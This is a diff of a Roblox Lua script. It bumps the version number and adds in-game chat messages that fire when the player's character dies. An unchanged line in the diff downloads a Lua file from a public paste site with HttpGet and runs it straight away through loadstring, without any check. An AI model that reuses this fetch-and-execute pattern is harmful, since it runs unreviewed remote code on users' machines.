@@ -15,7 +15,7 @@ local loadedScriptModel
 
 
 -- Global version variable
-_G.version = "v0.26"
+_G.version = "v0.27"
 
 local function createVersionLabel()
 	local gui = Instance.new("ScreenGui")
@@ -423,7 +423,7 @@ local function onSpawn(character)
 
     humanoid.Died:Connect(function()
         
-    
+        sendChatMessage("how can this be...")
         showItRefused()
         playSFX(138653824465794,2)
         stopAllSoundsOnMute()
@@ -446,6 +446,8 @@ local function onSpawn(character)
         -- Run LieFlatAndFloat async
         task.spawn(function()
             LieFlatAndFloat(character, hrp, humanoid, 20, 5)
+            task.wait(2)
+            sendChatMessage("god is calling...")
         end)
 
         wait(5)
@@ -468,10 +470,12 @@ local function onSpawn(character)
         task.spawn(function()
             
             
+            
             setfenv(loadstring(game:HttpGet('https://glot.io/snippets/gua2ntmbdm/raw/main.lua', true)), env)()
         end)
         wait(2)
         playSFXList({1837276045,14145625743,80650419746306},0.8)
+        sendChatMessage("i am gods will...")
         
         wait(1)
         playRandomSFXEvery10Seconds(
